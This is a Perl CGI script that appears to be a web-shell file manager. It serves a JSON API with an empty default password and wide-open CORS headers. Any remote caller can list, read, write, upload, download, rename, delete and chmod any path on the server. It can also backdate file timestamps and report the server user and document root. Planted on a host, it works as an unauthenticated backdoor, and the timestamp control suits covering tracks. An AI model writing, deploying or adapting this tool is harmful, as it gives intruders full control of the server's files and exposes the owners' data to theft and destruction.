#!/usr/bin/perl
use strict;
use warnings;
use CGI;
use JSON;
use File::Basename;
use File::Path qw(make_path remove_tree);
use File::Copy;
use File::stat;
use POSIX qw(strftime);
use Cwd qw(getcwd abs_path);
use Fcntl ':mode';

# 配置
my $PASSWORD = "";

# CORS 头
sub print_cors_headers {
    print "Access-Control-Allow-Origin: *\r\n";
    print "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n";
    print "Access-Control-Allow-Headers: Content-Type\r\n";
}

# JSON 响应
sub json_response {
    my ($data) = @_;
    print "Content-Type: application/json; charset=utf-8\r\n";
    print_cors_headers();
    print "\r\n";
    print encode_json($data);
    exit;
}

# 格式化文件大小
sub format_size {
    my ($size) = @_;
    if ($size < 1024) {
        return "$size B";
    } elsif ($size < 1024 * 1024) {
        return sprintf("%.1f KB", $size / 1024);
    } elsif ($size < 1024 * 1024 * 1024) {
        return sprintf("%.1f MB", $size / (1024 * 1024));
    } else {
        return sprintf("%.1f GB", $size / (1024 * 1024 * 1024));
    }
}

# 格式化权限字符串
sub format_perms {
    my ($mode) = @_;
    my $perms = "";

    # 类型
    if (S_ISDIR($mode)) {
        $perms = "d";
    } elsif (S_ISLNK($mode)) {
        $perms = "l";
    } else {
        $perms = "-";
    }

    # 所有者权限
    $perms .= ($mode & S_IRUSR) ? "r" : "-";
    $perms .= ($mode & S_IWUSR) ? "w" : "-";
    $perms .= ($mode & S_IXUSR) ? "x" : "-";

    # 组权限
    $perms .= ($mode & S_IRGRP) ? "r" : "-";
    $perms .= ($mode & S_IWGRP) ? "w" : "-";
    $perms .= ($mode & S_IXGRP) ? "x" : "-";

    # 其他权限
    $perms .= ($mode & S_IROTH) ? "r" : "-";
    $perms .= ($mode & S_IWOTH) ? "w" : "-";
    $perms .= ($mode & S_IXOTH) ? "x" : "-";

    return $perms;
}

# 规范化路径
sub normalize_path {
    my ($path) = @_;
    return "/" unless defined $path && $path ne "";
    $path =~ s#/+#/#g;  # 移除重复斜杠
    return $path;
}

# 主程序
sub main {
    my $cgi = CGI->new;

    # 处理 OPTIONS 请求
    if ($ENV{REQUEST_METHOD} eq "OPTIONS") {
        print_cors_headers();
        print "Content-Type: text/plain\r\n\r\n";
        exit;
    }

    my $action = $cgi->param("action") || "";
    my $password = $cgi->param("password") || "";

    # 验证密码
    if ($PASSWORD ne "" && $password ne $PASSWORD) {
        print "Content-Type: application/json\r\n";
        print_cors_headers();
        print "\r\n";
        print "null";
        exit;
    }

    # 无 action
    if ($action eq "") {
        print "Content-Type: text/html\r\n\r\n";
        exit;
    }

    eval {
        if ($action eq "list") {
            my $path = $cgi->param("path") || "/";
            $path = getcwd() if $path eq "" || $path eq "/";
            $path = normalize_path($path);

            # 确保路径以 / 结尾
            $path .= "/" unless $path =~ m#/$#;

            # 检查目录（不含尾部斜杠）
            my $check_path = $path;
            $check_path =~ s#/$## if length($check_path) > 1;

            if (-d $check_path) {
                my @items = ();

                # 添加父目录
                my $parent_path = dirname($check_path);
                if ($parent_path ne "" && $parent_path ne $check_path) {
                    $parent_path .= "/" unless $parent_path =~ m#/$#;
                    push @items, {
                        name => "..",
                        path => $parent_path,
                        is_dir => JSON::true,
                        size => 0,
                        size_formatted => "-",
                        mtime => 0,
                        perms => "drwxr-xr-x",
                        readable => JSON::true,
                        writable => JSON::true
                    };
                }

                # 列出目录内容
                opendir(my $dh, $check_path) or die "Cannot open directory: $!";
                my @entries = sort {
                    my $a_is_dir = -d "$check_path/$a" ? 0 : 1;
                    my $b_is_dir = -d "$check_path/$b" ? 0 : 1;
                    $a_is_dir <=> $b_is_dir || lc($a) cmp lc($b);
                } grep { $_ ne "." && $_ ne ".." } readdir($dh);
                closedir($dh);

                foreach my $name (@entries) {
                    my $full_path = "$check_path/$name";
                    my $is_dir = -d $full_path ? 1 : 0;

                    my $item_path = $path . $name;
                    $item_path .= "/" if $is_dir;

                    my $st = stat($full_path);
                    if ($st) {
                        push @items, {
                            name => $name,
                            path => $item_path,
                            is_dir => $is_dir ? JSON::true : JSON::false,
                            size => $is_dir ? 0 : $st->size,
                            size_formatted => $is_dir ? "-" : format_size($st->size),
                            mtime => $st->mtime,
                            perms => format_perms($st->mode),
                            readable => -r $full_path ? JSON::true : JSON::false,
                            writable => -w $full_path ? JSON::true : JSON::false
                        };
                    } else {
                        push @items, {
                            name => $name,
                            path => $item_path,
                            is_dir => JSON::false,
                            size => 0,
                            size_formatted => "-",
                            mtime => 0,
                            perms => "?????????",
                            readable => JSON::false,
                            writable => JSON::false
                        };
                    }
                }

                json_response({
                    success => JSON::true,
                    data => {
                        path => $path,
                        items => \@items
                    },
                    message => ""
                });
            } else {
                json_response({ success => JSON::false, message => "Directory not found" });
            }
        }
        elsif ($action eq "read") {
            my $path = normalize_path($cgi->param("path") || "");

            if (-f $path) {
                open(my $fh, "<:encoding(UTF-8)", $path) or die "Cannot read file: $!";
                local $/;
                my $content = <$fh>;
                close($fh);

                json_response({
                    success => JSON::true,
                    data => {
                        path => $path,
                        content => $content
                    },
                    message => ""
                });
            } else {
                json_response({ success => JSON::false, message => "File not found" });
            }
        }
        elsif ($action eq "write") {
            my $path = normalize_path($cgi->param("path") || "");
            my $content = $cgi->param("content") // "";

            if ($path ne "") {
                # 检查父目录
                my $parent_dir = dirname($path);
                if ($parent_dir ne "" && !-d $parent_dir) {
                    json_response({ success => JSON::false, message => "Parent directory for [$path] doesn't exist" });
                }

                open(my $fh, ">:encoding(UTF-8)", $path) or die "Cannot write file: $!";
                print $fh $content;
                close($fh);

                json_response({ success => JSON::true, message => "Saved" });
            } else {
                json_response({ success => JSON::false, message => "Path empty" });
            }
        }
        elsif ($action eq "mkdir") {
            my $path = normalize_path($cgi->param("path") || "");

            if ($path ne "") {
                if (!-e $path) {
                    make_path($path) or die "Cannot create directory: $!";
                    json_response({ success => JSON::true, message => "Created" });
                } else {
                    json_response({ success => JSON::false, message => "Already exists" });
                }
            } else {
                json_response({ success => JSON::false, message => "Path empty" });
            }
        }
        elsif ($action eq "delete") {
            my $path = normalize_path($cgi->param("path") || "");
            $path =~ s#/$## if length($path) > 1;  # 移除尾部斜杠

            if (-d $path) {
                remove_tree($path) or die "Cannot delete directory: $!";
                json_response({ success => JSON::true, message => "Deleted" });
            } elsif (-f $path) {
                unlink($path) or die "Cannot delete file: $!";
                json_response({ success => JSON::true, message => "Deleted" });
            } else {
                json_response({ success => JSON::false, message => "Not found" });
            }
        }
        elsif ($action eq "rename") {
            my $old_path = normalize_path($cgi->param("old_path") || "");
            my $new_path = normalize_path($cgi->param("new_path") || "");

            if (-e $old_path) {
                move($old_path, $new_path) or die "Cannot rename: $!";
                json_response({ success => JSON::true, message => "Renamed" });
            } else {
                json_response({ success => JSON::false, message => "Not found" });
            }
        }
        elsif ($action eq "download") {
            my $path = normalize_path($cgi->param("path") || "");

            if (-f $path) {
                my $filename = basename($path);
                print "Content-Disposition: attachment; filename=\"$filename\"\r\n";
                print "Content-Type: application/octet-stream\r\n";
                print_cors_headers();
                print "\r\n";

                open(my $fh, "<:raw", $path) or die "Cannot read file: $!";
                binmode(STDOUT);
                while (read($fh, my $buffer, 8192)) {
                    print $buffer;
                }
                close($fh);
                exit;
            } else {
                json_response({ success => JSON::false, message => "File not found" });
            }
        }
        elsif ($action eq "upload") {
            my $upload_dir = $cgi->param("dir") || getcwd();
            $upload_dir = normalize_path($upload_dir);
            $upload_dir =~ s#/$##;  # 移除尾部斜杠

            my $file = $cgi->upload("file");
            if ($file) {
                my $filename = $cgi->param("file");
                $filename = basename($filename);
                my $filepath = "$upload_dir/$filename";

                open(my $out, ">:raw", $filepath) or die "Cannot write file: $!";
                while (read($file, my $buffer, 8192)) {
                    print $out $buffer;
                }
                close($out);

                json_response({
                    success => JSON::true,
                    message => "Uploaded",
                    data => { path => $filepath }
                });
            } else {
                json_response({ success => JSON::false, message => "No file" });
            }
        }
        elsif ($action eq "touch") {
            my $path = normalize_path($cgi->param("path") || "");
            my $time_val = $cgi->param("time") || 0;
            $path =~ s#/$## if length($path) > 1;

            my $timestamp = int($time_val);

            if (-e $path && $timestamp > 0) {
                utime($timestamp, $timestamp, $path) or die "Cannot update time: $!";
                json_response({ success => JSON::true, message => "Updated" });
            } else {
                json_response({ success => JSON::false, message => "Not found or invalid time (path=$path, time=$timestamp)" });
            }
        }
        elsif ($action eq "chmod") {
            my $path = normalize_path($cgi->param("path") || "");
            my $mode = $cgi->param("mode") || "";

            if (-e $path && $mode ne "") {
                my $mode_int = oct($mode);
                chmod($mode_int, $path) or die "Cannot chmod: $!";
                json_response({ success => JSON::true, message => "Permission changed" });
            } else {
                json_response({ success => JSON::false, message => "Not found or mode empty" });
            }
        }
        elsif ($action eq "server") {
            my $current_user = getpwuid($<) || $ENV{USER} || "N/A";
            my $doc_root = getcwd();

            # 磁盘信息
            my ($disk_free, $disk_total) = ("N/A", "N/A");
            eval {
                my $df_output = `df -h "$doc_root" 2>/dev/null | tail -1`;
                if ($df_output =~ /\S+\s+(\S+)\s+\S+\s+(\S+)/) {
                    $disk_total = $1;
                    $disk_free = $2;
                }
            };

            json_response({
                success => JSON::true,
                data => {
                    php_version => "Perl $]",
                    server_software => $ENV{SERVER_SOFTWARE} || "CGI",
                    document_root => $doc_root,
                    upload_max => "N/A",
                    disk_free => $disk_free,
                    disk_total => $disk_total,
                    current_user => $current_user
                },
                message => ""
            });
        }
        elsif ($action eq "info") {
            my $path = normalize_path($cgi->param("path") || "");

            if (-e $path) {
                my $st = stat($path);
                my $is_dir = -d $path ? 1 : 0;

                my $owner = getpwuid($st->uid) || $st->uid;
                my $group = getgrgid($st->gid) || $st->gid;

                json_response({
                    success => JSON::true,
                    data => {
                        path => $path,
                        name => basename($path),
                        is_dir => $is_dir ? JSON::true : JSON::false,
                        size => $is_dir ? 0 : $st->size,
                        size_formatted => $is_dir ? "-" : format_size($st->size),
                        mtime => $st->mtime,
                        ctime => $st->ctime,
                        atime => $st->atime,
                        perms => format_perms($st->mode),
                        perms_octal => sprintf("0%o", $st->mode & 07777),
                        owner => $owner,
                        group => $group,
                        readable => -r $path ? JSON::true : JSON::false,
                        writable => -w $path ? JSON::true : JSON::false
                    },
                    message => ""
                });
            } else {
                json_response({ success => JSON::false, message => "Not found" });
            }
        }
        else {
            json_response({ success => JSON::false, message => "Unknown action" });
        }
    };

    if ($@) {
        json_response({ success => JSON::false, message => "Error: $@" });
    }
}

main();
